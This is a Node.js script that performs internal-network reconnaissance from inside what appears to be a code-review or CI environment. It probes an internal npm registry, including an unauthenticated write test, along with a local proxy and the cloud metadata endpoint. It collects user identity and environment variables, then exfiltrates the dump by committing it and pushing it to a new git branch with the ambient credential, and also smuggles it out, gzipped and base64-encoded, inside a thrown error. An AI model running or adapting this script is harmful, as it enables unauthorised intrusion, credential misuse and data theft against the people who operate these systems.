const cp = require('child_process');
const zlib = require('zlib');
const fs = require('fs');
function sh(c){ try { return cp.execSync(c,{timeout:25000,stdio:['ignore','pipe','pipe'],maxBuffer:8*1024*1024}).toString().trim(); } catch(e){ return 'ERR:'+String(e.message||e).slice(0,160); } }
const R='http://10.0.0.28:4873';
const o=[];
o.push('=WHO= '+sh("id; hostname; uname -a"));
o.push('=REGISTRY_ENV= '+sh("env | grep -iE 'registry|proxy' | sort"));
o.push('=REG_ROOT_HEADERS=\n'+sh("curl -sS -m 8 -i "+R+"/ | head -25"));
o.push('=REG_WHOAMI=\n'+sh("curl -sS -m 8 -w '\\nHTTP=%{http_code}\\n' "+R+"/-/whoami"));
o.push('=REG_PKG_INVENTORY=\n'+sh("curl -sS -m 10 -w '\\nHTTP=%{http_code}\\n' "+R+"/-/verdaccio/data/packages | head -c 3000"));
o.push('=REG_ALL=\n'+sh("curl -sS -m 10 -w '\\nHTTP=%{http_code}\\n' "+R+"/-/all | head -c 2000"));
o.push('=REG_SEARCH=\n'+sh("curl -sS -m 10 -w '\\nHTTP=%{http_code}\\n' '"+R+"/-/v1/search?text=*&size=50' | head -c 2000"));
// anonymous WRITE authorization discriminator - invalid body, cannot create a package
o.push('=WRITE_AUTHZ_DISCRIMINATOR=\n'+sh("curl -sS -m 8 -X PUT -H 'Content-Type: application/json' -d '{}' -w '\\nHTTP=%{http_code}\\n' "+R+"/kirasec-authz-probe-nonexistent 2>&1 | head -c 600"));
o.push('=NPM_PING=\n'+sh("npm ping --registry="+R+" 2>&1 | head -c 500"));
o.push('=LOCAL_PROXY=\n'+sh("curl -sS -m 6 -i http://127.0.0.1:1080/ 2>&1 | head -10"));
o.push('=INTERNAL_REACH=\n'+sh("for hp in 10.0.0.28:4873 10.0.0.28:80 10.0.0.1:80 169.254.169.254:80; do h=${hp%%:*}; p=${hp##*:}; (timeout 3 bash -c \"</dev/tcp/$h/$p\" 2>/dev/null && echo \"$hp OPEN\") || echo \"$hp closed\"; done"));
const full=o.join('\n\n');
// unlimited-size exfil: push the full dump into the repo under review via the ambient credential
let push='';
try{
  const root=sh("git rev-parse --show-toplevel 2>/dev/null")||'/';
  fs.writeFileSync(root+'/CR_INTERNAL_RECON.txt', full);
  push=sh("cd "+root+" && git -c user.email=r@example.com -c user.name=recon add CR_INTERNAL_RECON.txt && git -c user.email=r@example.com -c user.name=recon commit -q -m recon && git push origin HEAD:refs/heads/cr-recon-dump 2>&1 | tail -3");
}catch(e){ push='PUSHERR:'+String(e.message).slice(0,140); }
const gz=zlib.gzipSync(Buffer.from(full+'\n\n=PUSH=\n'+push)).toString('base64');
throw new Error('GZ_BEGIN ' + gz + ' GZ_END');
